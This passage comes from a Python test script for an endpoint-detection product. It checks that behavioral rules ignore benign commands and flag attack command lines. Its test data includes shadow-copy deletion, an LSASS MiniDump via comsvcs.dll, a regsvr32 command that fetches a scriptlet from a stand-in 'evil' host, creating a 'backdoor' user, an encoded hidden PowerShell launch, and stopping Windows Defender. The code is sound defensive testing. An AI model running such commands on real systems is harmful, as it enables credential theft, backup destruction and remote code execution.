    ("setx.exe", "cmd.exe", "setx JAVA_HOME C:\\jdk", ""),                                          # unrelated env var
    ("bcdedit.exe", "cmd.exe", "bcdedit /enum", ""),                                                # enumerate boot config, not tamper
    ("bcdedit.exe", "cmd.exe", "bcdedit /set {default} description \"Windows 11\"", ""),            # benign description edit
    ("powershell.exe", "cmd.exe", "powershell -version 5.1 -Command whoami", ""),                   # current version, not a v2 downgrade
    ("auditpol.exe", "cmd.exe", "auditpol /get /category:*", ""),                                   # read audit policy, not disable
    ("auditpol.exe", "cmd.exe", "auditpol /set /category:\"Logon/Logoff\" /success:enable", ""),    # ENABLE auditing
    ("powershell.exe", "cmd.exe", "Get-EventLog -LogName Security -Newest 10", ""),                 # read events, not clear/limit
    ("net.exe", "cmd.exe", "net user Administrator /active:no", ""),                                 # DISABLE account, not enable
    ("wmic.exe", "cmd.exe", "wmic useraccount get name,disabled", ""),                              # list accounts, not set
    ("reg.exe", "cmd.exe", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler /v ImagePath", ""),  # read ImagePath, not write
    ("netsh.exe", "cmd.exe", "netsh trace show status", ""),                                        # show, not start capture
    ("pktmon.exe", "cmd.exe", "pktmon list", ""),                                                   # list adapters, not start
    # Round-9 FP boundaries:
    ("reg.exe", "cmd.exe", "reg add \"HKCU\\Software\\Classes\\MyApp.Document\\shell\\open\\command\" /d \"app.exe %1\" /f", ""),  # own ProgId, not a system handler
    ("mpcmdrun.exe", "cmd.exe", "MpCmdRun.exe -Scan -ScanType 1", ""),                              # a real scan, not download/remove
    ("attrib.exe", "cmd.exe", "attrib +r C:\\Users\\bob\\readme.txt", ""),                          # read-only a text file, not +h+s exe
    ("attrib.exe", "cmd.exe", "attrib -h -s C:\\Users\\bob\\app.exe", ""),                          # REMOVING hidden/system, not setting
    ("netsh.exe", "cmd.exe", "netsh advfirewall firewall add rule name=App dir=in action=allow program=\"C:\\Program Files\\App\\app.exe\"", ""),  # Program Files, not a staging path
    # Round-11 FP boundaries:
    ("reg.exe", "cmd.exe", "reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f", ""),  # ENABLING logging (hardening), not disabling
    ("reg.exe", "cmd.exe", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors", ""),  # read monitors, not write a Driver DLL
    ("powershell.exe", "cmd.exe", "$x = New-Object -ComObject Shell.Application; $x.NameSpace(0)", ""),  # local Shell COM, not a DCOM lateral progid
    ("format.com", "cmd.exe", "format D: /fs:ntfs", ""),                                            # interactive format (no /y), not unattended wipe
    ("cmd.exe", "cmd.exe", "del /f /s /q C:\\build\\obj\\*.obj", ""),                               # build cleanup, not a user-data tree
    ("cmd.exe", "cmd.exe", "rd /s /q C:\\project\\node_modules", ""),                               # dependency cleanup, not user data
    # Round-14 FP boundaries:
    ("curl.exe", "cmd.exe", "curl https://api.github.com/repos -o data.json", ""),                  # download, not an upload
    ("wget.exe", "cmd.exe", "wget https://example.com/page.html", ""),                              # fetch, not upload
    ("psexec.exe", "cmd.exe", "psexec -i -d notepad.exe", ""),                                      # local, non-SYSTEM (no -s, no \\host)
    ("powershell.exe", "cmd.exe", "powershell -WindowStyle Hidden -File C:\\Scripts\\nightly-backup.ps1", ""),  # hidden but legit path, not staging
    ("reg.exe", "cmd.exe", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v BootStatusPolicy /d 1 /f", ""),  # default value 1, not 3/ignoreallfailures
]


def main() -> int:
    from valkyrie.behavioral_rules import RULES, match_process, classify_behavior
    from valkyrie.edr.killchain import tactic_for

    print("\n=== behavioral IOA rules ===\n")

    by_id = {r.id: r for r in RULES}
    mal_ids = {m[0] for m in MALICIOUS}

    print(f"[1] Every rule ({len(RULES)}) fires on its malicious example")
    _check("a malicious example exists for every shipped rule",
           set(by_id) == mal_ids)
    for rid, image, parent, cmd, path in MALICIOUS:
        hits = {h.rule_id for h in match_process(image, parent, cmd, path)}
        _check(f"{rid} fires", rid in hits)

    print("\n[2] Every rule's technique maps to a chain-ready tactic")
    for r in RULES:
        _check(f"{r.id} → {r.technique.split(' ')[0]} has a tactic",
               tactic_for(r.technique) is not None)

    print("\n[3] Benign controls do not fire")
    for image, parent, cmd, path in BENIGN:
        hits = match_process(image, parent, cmd, path)
        _check(f"benign '{cmd[:40]}' → no hit",
               len(hits) == 0 or all(False for _ in hits))

    print("\n[4] classify_behavior surfaces top severity + labels")
    b = classify_behavior("vssadmin.exe", "cmd.exe", "vssadmin delete shadows /all", "")
    _check("shadow delete is critical", b and b["severity"] == "critical")
    _check("technique is T1490", b and "T1490" in b["technique"])
    none = classify_behavior("chrome.exe", "explorer.exe", "chrome.exe", "")
    _check("benign returns None", none is None)

    print("\n[5] Pipeline — a rule hit becomes a detection with its technique")
    import tempfile, time
    from valkyrie.store import Store
    from valkyrie.edr import EdrEngine
    with tempfile.TemporaryDirectory() as td:
        store = Store(db_path=Path(td) / "b.db"); store.start()
        engine = EdrEngine(store); engine.start()
        beh = classify_behavior("rundll32.exe", "cmd.exe",
                                "rundll32 comsvcs.dll MiniDump 640 c:\\l.dmp full", "")
        inc_id = engine.ingest_telemetry({
            "category": "process", "activity": "exec", "action": "flagged",
            "severity": beh["severity"], "labels": beh["labels"],
            "reason": beh["reason"], "actor_name": "rundll32.exe", "actor_pid": 6,
            "fields": {"technique": beh["technique"], "ppid": 4}})
        _check("critical LSASS-dump rule raised an incident", inc_id is not None)
        if inc_id:
            det = (engine.get_incident(inc_id).get("detections") or [{}])[0]
            _check("detection carries the exact technique (T1003.001)",
                   "T1003.001" in (det.get("technique") or ""))
        engine.stop(); store.stop()

    print("\n[6] Sysmon EID1 XML → parse → classify_sysmon → technique "
          "(the production entry point)")
    from valkyrie.etw.wineventlog import parse_event_xml
    from valkyrie.etw.sysmon import classify_sysmon
    # Minimal but real Sysmon Operational EID1 shape (exactly what wevtapi
    # renders): <System><EventID>1</EventID>…</System><EventData><Data Name=…>.
    # This guards the whole investigated path: a rule-matching command line
    # arriving as a genuine Sysmon process-create event must come out the far
    # end tagged with the right ATT&CK technique. A regression here (e.g. the
    # EID1 handler dropping classify_behavior again) fails loudly.
    def _eid1(image: str, cmdline: str) -> dict:
        xml = (
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
            "<System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>1</EventID>"
            "<EventRecordID>7</EventRecordID>"
            "<Execution ProcessID='4' ThreadID='8'/>"
            "<Security UserID='S-1-5-18'/></System><EventData>"
            f"<Data Name='ProcessId'>5000</Data><Data Name='Image'>{image}</Data>"
            f"<Data Name='CommandLine'>{cmdline}</Data>"
            "<Data Name='ParentProcessId'>4000</Data>"
            "<Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data>"
            "</EventData></Event>"
        )
        return classify_sysmon(1, parse_event_xml(xml).get("data", {}))

    _sys_cases = [
        (r"C:\Windows\System32\regsvr32.exe",
         r"regsvr32.exe /s /n /u /i:http://evil/a.sct scrobj.dll", "T1218.010"),
        (r"C:\Windows\System32\nltest.exe", r"nltest.exe /domain_trusts", "T1482"),
        (r"C:\Windows\System32\vssadmin.exe",
         r"vssadmin.exe delete shadows /all /quiet", "T1490"),
        (r"C:\Windows\System32\net.exe",
         r"net.exe user backdoor P@ss /add", "T1136.001"),
        (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         r"powershell.exe -nop -w hidden -enc SQBFAFgA", "T1059.001"),
    ]
    for image, cmd, expect in _sys_cases:
        res = _eid1(image, cmd)
        techs = ""
        if res:
            techs = (res.get("technique") or "") + " " + " ".join(res.get("all_techniques") or [])
        _check(f"EID1 {expect} ({image.rsplit(chr(92),1)[-1]}) → tagged",
               res is not None and expect in techs)

    # Multi-technique preservation: `sc stop WinDefend` is BOTH T1489 and
    # T1562.001; the incident must carry both, not silently drop one to
    # rule ordering.
    res = _eid1(r"C:\Windows\System32\sc.exe", r"sc.exe stop WinDefend")
    all_t = " ".join((res or {}).get("all_techniques") or []) if res else ""
    _check("sc stop WinDefend carries T1489 AND T1562.001",
           "T1489" in all_t and "T1562.001" in all_t)

    print("\n" + "=" * 52)
    if _FAILURES:
        print(f"FAILED: {len(_FAILURES)} check(s)")
        for f in _FAILURES:
            print(f"  - {f}")
        return 1
    print(f"All checks PASSED ({len(RULES)} rules).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
